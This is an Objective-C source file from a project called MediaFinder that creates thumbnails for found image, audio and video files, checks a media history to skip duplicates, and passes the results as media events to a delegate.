//
//  MediaFoundThumbnailHelper.m
//  MediaFinder
//
//  Created by Makara Khloth on 2/17/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MediaFoundThumbnailHelper.h"
#import "FileSystemEntry.h"
#import "MediaFinder.h"
#import "MediaFinderHistory.h"
#import "MediaHistoryDAO.h"

#import "MediaThumbnailManagerImp.h"
#import "MediaErrorConstant.h"
#import "MediaInfo.h"

#import "DateTimeFormat.h"
#import "EventDelegate.h"
#import "MediaEvent.h"
#import "ThumbnailEvent.h"
#import "FxSystemEvent.h"

@interface MediaFoundThumbnailHelper (private)

- (void) startCreateThumbnail;
- (void) doCreateThumbnail: (FileSystemEntry *) aEntry;

@end

@implementation MediaFoundThumbnailHelper

@synthesize mMediaFinder;
@synthesize mMediaHistory;

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate andThumbnailPath: (NSString *) aPath {
	if ((self = [super init])) {
		mMediaThumbnailManagerImp = [[MediaThumbnailManagerImp alloc] initWithThumbnailDirectory:aPath];
		mEventDelegate = aEventDelegate;
	}
	return (self);
}

- (void) createThumbnail: (NSArray *) aFoundMediaArray {
	mFoundMediaArray = [[NSMutableArray arrayWithArray:aFoundMediaArray] retain];
	[self startCreateThumbnail];
}

- (void) thumbnailCreationDidFinished: (NSError *) aError
							mediaInfo: (MediaInfo *) aMedia
						thumbnailPath: (id) aPaths {
	DLog (@"aError = %@, aMedia = %@, aPaths = %@, aMedia.mMediaSize = %d", aError, aMedia, aPaths, [aMedia mMediaSize]);
	
	//NSLog (@"thumnbanil did finish ===> aError = %@, aMedia = %@, aPaths = %@, aMedia.mMediaSize = %d", aError, aMedia, aPaths, [aMedia mMediaSize]);

	if ([aError code]==kMediaThumbnailOK || ([aError code]==kMediaThumbnailCannotGetThumbnail &&
											 [aMedia mMediaInputType] != kMediaInputTypeImage)) {
		MediaEvent *mediaEvent=[[MediaEvent alloc]init];
		switch ([aMedia mMediaInputType]) {
			case kMediaInputTypeImage: {
				ThumbnailEvent *tEvent=[[ThumbnailEvent alloc]init];
				[tEvent setFullPath:(NSString *)aPaths];
				[tEvent setEventType:kEventTypeCameraImageThumbnail];	 
				[tEvent setDateTime:[DateTimeFormat phoenixDateTime]];
				[tEvent setActualSize:[aMedia mMediaSize]];
				[tEvent setActualDuration:[aMedia mMediaLength]];
				[mediaEvent addThumbnailEvent:tEvent];
				[tEvent release];
				[mediaEvent setEventType:kEventTypeCameraImage];
			} break;
			case kMediaInputTypeVideo: {
				for (NSString *path in aPaths) {
					ThumbnailEvent *tEvent=[[ThumbnailEvent alloc]init];
					[tEvent setFullPath:path];
					[tEvent setEventType:kEventTypeVideoThumbnail];	 
					[tEvent setActualSize:[aMedia mMediaSize]];
					[tEvent setDateTime:[DateTimeFormat phoenixDateTime]];
					[tEvent setActualDuration:[aMedia mMediaLength]];
					[mediaEvent addThumbnailEvent:tEvent];
					[tEvent release];
				}
				
				if (![[mediaEvent thumbnailEvents] count]) { // No paths to frame of video (mov of recording file pass to video thumbnail)
					ThumbnailEvent *tEvent=[[ThumbnailEvent alloc]init];
					[tEvent setFullPath:@""];
					[tEvent setEventType:kEventTypeVideoThumbnail];
					[tEvent setActualSize:[aMedia mMediaSize]];
					[tEvent setDateTime:[DateTimeFormat phoenixDateTime]];
					[tEvent setActualDuration:[aMedia mMediaLength]];
					[mediaEvent addThumbnailEvent:tEvent];
					[tEvent release];
				}
				
				[mediaEvent setEventType:kEventTypeVideo];
			} break;
			case kMediaInputTypeAudio: {
				ThumbnailEvent *tEvent=[[ThumbnailEvent alloc]init];
				[tEvent setFullPath:(NSString *)aPaths];
				[tEvent setEventType:kEventTypeAudioThumbnail];	 
				[tEvent setDateTime:[DateTimeFormat phoenixDateTime]];
				[tEvent setActualSize:[aMedia mMediaSize]];
				[tEvent setActualDuration:[aMedia mMediaLength]];
				[mediaEvent addThumbnailEvent:tEvent];
				[tEvent release];
				[mediaEvent setEventType:kEventTypeAudio];
			} break;
			default:
				break;
		}
		[mediaEvent setFullPath:[aMedia mMediaFullPath]];
		[mediaEvent setMDuration:[aMedia mMediaLength]];
		[mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	
		if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent];
		}
		[mediaEvent release];
		
		// Store in media history
		MediaHistoryDAO *historyDAO = [[MediaHistoryDAO alloc] initWithMediaHistory:mMediaHistory];
		[historyDAO insertMediaIntoHistory:[aMedia mMediaFullPath] size:[aMedia mMediaSize]];
		[historyDAO release];
	}
		
	[mFoundMediaArray removeObjectAtIndex:0];
	[self performSelector:@selector(startCreateThumbnail) withObject:nil afterDelay:0.1];
}

- (void) startCreateThumbnail {
	if ([mFoundMediaArray count]) {
		//NSLog(@">>count %d", [mFoundMediaArray count]);
		FileSystemEntry *entry = [mFoundMediaArray objectAtIndex:0];
		
		NSFileManager *fileManager = [NSFileManager defaultManager];
		NSDictionary *fileAttributes = [fileManager attributesOfItemAtPath:[entry mFullPath]
																	 error:nil];
//		NSUInteger oneMeg = 1020 * 1024;
//		NSUInteger sizeInMeg = [fileAttributes fileSize] / oneMeg;
		// Check max file size 10 Mb
//		if (sizeInMeg > 10) {
		if (0) {
			// Media event too big. The maximum size is ####. Application won't deliver media event thumbnail
			DLog(@"Entry to create thumbnail is too BIG, path = %@, size = %d", [entry mFullPath], [fileAttributes fileSize]);
			FxSystemEvent *systemEvent = [[FxSystemEvent alloc] init];
			[systemEvent setDirection:kEventDirectionOut];
			[systemEvent setSystemEventType:kSystemEventTypeMediaEventMaxSizeReached];
			[systemEvent setDateTime:[DateTimeFormat phoenixDateTime]];
			NSString *text = NSLocalizedString(@"kMediaEventTooBigCannotDeliver", @"");
			[systemEvent setMessage:text];
			if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
				[mEventDelegate performSelector:@selector(eventFinished:) withObject:systemEvent];
			}
			[systemEvent release];
			
			[mFoundMediaArray removeObject:entry];
			[self performSelector:@selector(startCreateThumbnail) withObject:nil afterDelay:0.1];
		} else {
			// Check dupblicate file in media history
			MediaHistoryDAO *historyDAO = [[MediaHistoryDAO alloc] initWithMediaHistory:mMediaHistory];
			BOOL oldFile = [historyDAO isMediaInHistory:[entry mFullPath] size:[fileAttributes fileSize]];
			[historyDAO release];
			
			if (!oldFile) {
				//NSLog(@"Entry to create thumbnail is NEW, path = %@, size = %d", [entry mFullPath], [fileAttributes fileSize]);
				DLog(@"Entry to create thumbnail is NEW, path = %@, size = %d", [entry mFullPath], [fileAttributes fileSize]);
				[self doCreateThumbnail:entry];
			} else {
				//NSLog(@"Entry to create thumbnail is OLD, path = %@, size = %d", [entry mFullPath], [fileAttributes fileSize]);
				DLog(@"Entry to create thumbnail is OLD, path = %@, size = %d", [entry mFullPath], [fileAttributes fileSize]);
				[mFoundMediaArray removeObject:entry];
				[self performSelector:@selector(startCreateThumbnail) withObject:nil afterDelay:0.1];
			}
		}
	} else {
		//NSLog(@">>no count");
		if (mMediaFinder) {
			//NSLog(@"@@@@@@@@@@@  MediaFinder try to call back @@@@@@@@@@@@@@");
			[mMediaFinder performSelector:@selector(thumbnailCreationCompleted:) withObject:self afterDelay:0.1];
		}
	}
}

- (void) doCreateThumbnail: (FileSystemEntry *) aEntry {
	switch ([aEntry mMediaType]) {
		case kFinderMediaTypeImage: {
			[mMediaThumbnailManagerImp createImageThumbnail:[aEntry mFullPath] delegate:self];
		} break;
		case kFinderMediaTypeAudio: {
			[mMediaThumbnailManagerImp createAudioThumbnail:[aEntry mFullPath] delegate:self];
		} break;
		case kFinderMediaTypeVideo: {
			[mMediaThumbnailManagerImp createVideoThumbnail:[aEntry mFullPath] delegate:self];
		} break;
		default: {
			[mFoundMediaArray removeObject:aEntry];
			[self performSelector:@selector(startCreateThumbnail) withObject:nil afterDelay:0.1];
		} break;
	}
}

- (void) dealloc {
	[mFoundMediaArray release];
	[mMediaThumbnailManagerImp release];
	[super dealloc];
}

@end
